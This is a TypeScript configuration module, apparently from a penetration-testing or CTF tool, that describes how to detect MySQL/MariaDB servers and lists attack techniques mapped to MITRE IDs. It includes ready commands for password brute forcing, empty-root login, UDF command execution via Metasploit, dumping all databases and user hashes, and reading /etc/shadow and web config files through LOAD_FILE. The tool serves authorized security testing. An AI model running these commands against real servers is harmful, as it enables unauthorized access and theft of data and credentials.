/**
 * MySQL Service Configuration
 * MySQL / MariaDB Database
 * 
 * @version 1.0.0
 * @author Security Team
 */
import type { ServiceConfig } from '../types';

export const mysqlConfig: ServiceConfig = {
  id: 'mysql',
  name: 'MySQL / MariaDB',
  description: 'MySQL/MariaDB - популярная реляционная СУБД с открытым исходным кодом. Широко используется в веб-приложениях (LAMP/LEMP стек). Часто атакуется через слабые пароли, SQL-инъекции и UDF-эксплойты.',
  categoryId: 'database',
  version: '1.0.0',
  tags: ['database', 'mysql', 'mariadb', 'linux', 'web'],

  matchers: {
    serviceNames: ['mysql', 'mariadb'],
    cpePatterns: ['cpe:/a:mysql:mysql', 'cpe:/a:mariadb:mariadb', 'cpe:/a:oracle:mysql'],
    bannerRegex: [
      'mysql',
      'mariadb',
      '\\x00\\x00\\x00\\x0a[\\d.]+',  // MySQL protocol
      'MySQL server',
    ],
    productPatterns: ['MySQL', 'MariaDB', 'Percona', 'Galera'],
    standardPorts: [3306, 3307, 33060],
    nseScriptMatchers: [
      { scriptName: 'mysql-info', outputPattern: '.' },
      { scriptName: 'mysql-empty-password', outputPattern: '.' },
    ],
  },

  confidenceThreshold: 30,

  techniques: [
    {
      id: 'mysql-enum',
      name: 'MySQL Enumeration',
      mitreId: 'T1046',
      description: 'Сбор информации о MySQL сервере: версия, пользователи, базы данных.',
      commands: [
        { tool: 'nmap', command: 'nmap -p 3306 --script mysql-info,mysql-audit <target>', description: 'MySQL info scan' },
        { tool: 'mysql', command: 'mysql -h <target> -u root -p', description: 'MySQL client connection' },
        { tool: 'metasploit', command: 'use auxiliary/scanner/mysql/mysql_version', description: 'MySQL version scan' },
      ],
      nseScripts: [
        { name: 'mysql-info', description: 'Информация о MySQL сервере', safe: true },
      ],
      difficulty: 'easy',
      tags: ['enumeration', 'reconnaissance'],
    },
    {
      id: 'mysql-bruteforce',
      name: 'MySQL Brute Force',
      mitreId: 'T1110',
      description: 'Подбор паролей MySQL. Root без пароля - частая находка.',
      commands: [
        { tool: 'hydra', command: 'hydra -l root -P passwords.txt mysql://<target>', description: 'MySQL brute force' },
        { tool: 'nmap', command: 'nmap -p 3306 --script mysql-brute <target>', description: 'NSE brute force' },
        { tool: 'metasploit', command: 'use auxiliary/scanner/mysql/mysql_login', description: 'MSF MySQL login' },
      ],
      difficulty: 'easy',
      notes: 'Попробуйте: root без пароля, root/root, admin/admin, user/user',
      tags: ['bruteforce', 'authentication'],
    },
    {
      id: 'mysql-empty-root',
      name: 'Empty Root Password Check',
      description: 'Проверка доступа root без пароля - очень распространенная конфигурация.',
      commands: [
        { tool: 'mysql', command: 'mysql -h <target> -u root', description: 'Try root without password' },
        { tool: 'nmap', command: 'nmap -p 3306 --script mysql-empty-password <target>', description: 'Empty password check' },
      ],
      difficulty: 'easy',
      tags: ['misconfiguration', 'default-credentials'],
    },
    {
      id: 'mysql-udf-exploit',
      name: 'UDF Exploitation',
      mitreId: 'T1059',
      description: 'Использование User Defined Functions для выполнения команд ОС.',
      commands: [
        { tool: 'mysql', command: 'SELECT load_file(\'/etc/passwd\')', description: 'File read test' },
        { tool: 'mysql', command: 'SELECT \'-h \' INTO OUTFILE \'/tmp/test\'', description: 'File write test' },
        { tool: 'metasploit', command: 'use exploit/multi/mysql/mysql_udf_payload', description: 'UDF payload exploit' },
      ],
      difficulty: 'hard',
      prerequisites: ['MySQL root доступ', 'FILE привилегия', 'Права на запись в plugin dir'],
      tags: ['rce', 'post-exploitation', 'privilege-escalation'],
    },
    {
      id: 'mysql-dump',
      name: 'Database Dumping',
      mitreId: 'T1005',
      description: 'Извлечение данных из MySQL баз данных.',
      commands: [
        { tool: 'mysqldump', command: 'mysqldump -h <target> -u root -p --all-databases', description: 'Full database dump' },
        { tool: 'mysql', command: 'mysql -h <target> -u root -p -e "SHOW DATABASES"', description: 'List databases' },
        { tool: 'mysql', command: 'mysql -h <target> -u root -p -e "SELECT * FROM mysql.user"', description: 'Dump user hashes' },
      ],
      difficulty: 'medium',
      tags: ['data-exfiltration', 'enumeration'],
    },
    {
      id: 'mysql-file-read',
      name: 'Arbitrary File Read',
      description: 'Чтение файлов системы через LOAD_FILE при наличии FILE привилегии.',
      commands: [
        { tool: 'mysql', command: 'SELECT load_file(\'/etc/passwd\')', description: 'Read /etc/passwd' },
        { tool: 'mysql', command: 'SELECT load_file(\'/etc/shadow\')', description: 'Read /etc/shadow (needs root)' },
        { tool: 'mysql', command: 'SELECT load_file(\'/var/www/html/config.php\')', description: 'Read web config' },
      ],
      difficulty: 'medium',
      prerequisites: ['FILE привилегия', 'MySQL root доступ'],
      tags: ['file-read', 'information-disclosure'],
    },
  ],

  triggers: [],

  ui: {
    icon: 'database',
    color: '#0ea5e9',
    displayPriority: 90,
  },

  references: [
    { title: 'MySQL Pentesting', url: 'https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql' },
  ],

  notes: 'MySQL часто сконфигурирован с root без пароля. Проверяйте FILE привилегию для чтения файлов и UDF для RCE. В CTF флаги часто в базах данных.',
};

export default mysqlConfig;
